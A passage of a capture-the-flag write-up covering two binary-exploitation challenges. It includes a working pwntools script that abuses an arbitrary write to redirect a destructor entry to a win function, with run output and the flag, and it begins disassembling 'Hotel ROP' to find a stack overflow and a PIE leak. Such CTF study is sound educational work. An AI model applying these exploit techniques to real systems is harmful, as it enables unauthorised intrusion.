</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040070c</span> <span class="err">&lt;+</span><span class="mi">127</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400710</span> <span class="err">&lt;+</span><span class="mi">131</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400719</span> <span class="err">&lt;+</span><span class="mi">140</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x400720</span> <span class="p">&lt;</span><span class="no">magic</span><span class="p">+</span><span class="mi">147</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040071b</span> <span class="err">&lt;+</span><span class="mi">142</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400530</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400720</span> <span class="err">&lt;+</span><span class="mi">147</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000400721</span> <span class="err">&lt;+</span><span class="mi">148</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>We can see that the program calls scanf two times and take unsigned long long, first it takes a value, second input takes another input and attempt to write the value given by the first input to the address of the second input, that means it allow us to write any value to any address having r/w access to.
Since the RELRO is disabled, we can overwrite the destructors which will be run once the process will come to an end to the address of the win function which prints the flag:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-magic-trick.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;magic_trick&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__do_global_dtors_aux_fini_array_entry&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Running</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">magic_trick</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">magic</span><span class="o">-</span><span class="n">trick</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7481</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/d4mianwayne/Pwning/CTFs/ductf/magic_trick&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
</span></span><span class="line"><span class="cl">    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">No</span> <span class="n">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl">    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">thanks</span>
</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="n">are</span> <span class="n">a</span> <span class="n">real</span> <span class="n">magician</span>
</span></span><span class="line"><span class="cl"><span class="n">dctf</span><span class="p">{</span><span class="mi">1</span><span class="n">_L1k3_M4G1c</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
</span></span></code></pre></div><h3 id="hotel-rop" class="relative group">Hotel ROP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#hotel-rop" aria-label="Anchor">#</a></span></h3><p>This was yet another ROP challenge but kind of a twist on it, it has PIE and NX enabled but the Canary was disabled:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">hotel_rop</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Partial</span>
</span></span></code></pre></div><p>Now, checking the function it contains, we can see there are several user-defined functions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">i</span> <span class="no">functions</span> 
</span></span><span class="line"><span class="cl"><span class="no">All</span> <span class="no">defined</span> <span class="no">functions</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Non-debugging</span> <span class="no">symbols</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001000</span>  <span class="no">_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001030</span>  <span class="no">puts@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001040</span>  <span class="no">system@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001050</span>  <span class="no">printf@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001060</span>  <span class="no">alarm@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001070</span>  <span class="no">fgets@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001080</span>  <span class="no">exit@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001090</span>  <span class="no">__cxa_finalize@plt</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000010a0</span>  <span class="no">_start</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000010d0</span>  <span class="no">deregister_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001100</span>  <span class="no">register_tm_clones</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001140</span>  <span class="no">__do_global_dtors_aux</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001180</span>  <span class="no">frame_dummy</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001185</span>  <span class="no">loss</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000011dc</span>  <span class="no">california</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001283</span>  <span class="no">silicon_valley</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000000000000131e</span>  <span class="no">vuln</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000000000000136d</span>  <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000000013b0</span>  <span class="no">__libc_csu_init</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001410</span>  <span class="no">__libc_csu_fini</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000001414</span>  <span class="no">_fini</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Checking for the function named main function, we can see it prints the address of the main function, so much for the PIE security, PIE can bypassed since we get the address of the function, we can obtain the base address of the ELF itself. Then it calls the function vuln:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136d</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136e</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001371</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001376</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1060</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000137b</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xffffffffffffffeb</span><span class="p">]</span>        <span class="c1"># 0x136d &lt;main&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001382</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xdb7</span><span class="p">]</span>        <span class="c1"># 0x2140
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001389</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000138e</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1050</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001393</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001398</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x131e</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000139d</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000013a2</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000013a3</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131e</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131f</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001322</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001326</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xda3</span><span class="p">]</span>        <span class="c1"># 0x20d0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000132d</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001332</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d27</span><span class="p">]</span>        <span class="c1"># 0x4060 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001339</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000133d</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001342</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001345</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1070</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000134a</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000134e</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x135e</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001350</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xd91</span><span class="p">]</span>        <span class="c1"># 0x20e8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001357</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000135c</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x136b</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">77</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000135e</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xdb3</span><span class="p">]</span>        <span class="c1"># 0x2118
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001365</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136a</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000136b</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000136c</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>The vuln function was calling the fgets and the given size to the fgets more than the buffer could hold, so it was a stack overflow. Secondly, there were two other functions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">california</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">california</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011dc</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011dd</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011e0</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe72</span><span class="p">]</span>        <span class="c1"># 0x2059
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011e7</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011ec</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe85</span><span class="p">]</span>        <span class="c1"># 0x2078
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011f3</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011f8</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e7a</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011fe</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001200</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e69</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001207</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x2f</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000120b</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e67</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001211</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001214</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e5e</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000121a</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e58</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001220</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001222</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e47</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001229</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x62</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000122d</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e45</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001233</span> <span class="err">&lt;+</span><span class="mi">87</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
